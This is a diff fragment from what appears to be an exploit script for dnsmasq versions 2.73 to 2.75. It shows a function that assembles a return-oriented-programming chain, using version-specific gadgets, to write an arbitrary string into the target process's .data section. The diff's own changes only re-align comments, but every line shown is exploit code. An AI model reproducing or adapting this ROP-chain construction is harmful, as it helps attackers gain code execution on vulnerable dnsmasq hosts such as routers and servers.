@@ -282,10 +282,10 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(ROP[a][v]["pop all"])  # pop eax ; pop ebx ; pop esi ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi
                 rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in ebx
-                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi
 
         if dnsmasq_version == "2.75" or dnsmasq_version == "2.74" or dnsmasq_version == "2.73":
             for x in range(0, len(string), 4):
@@ -294,8 +294,8 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(ROP[a][v]["pop ebx"])  # pop ebx ; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
                 rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
-                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in ebx
-                rop_chain += Base.pack32(NOP[architecture])         # NOP (0x90909090) in esi
+                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in ebx
+                rop_chain += Base.pack32(NOP[architecture])     # NOP (0x90909090) in esi
 
     return rop_chain
 
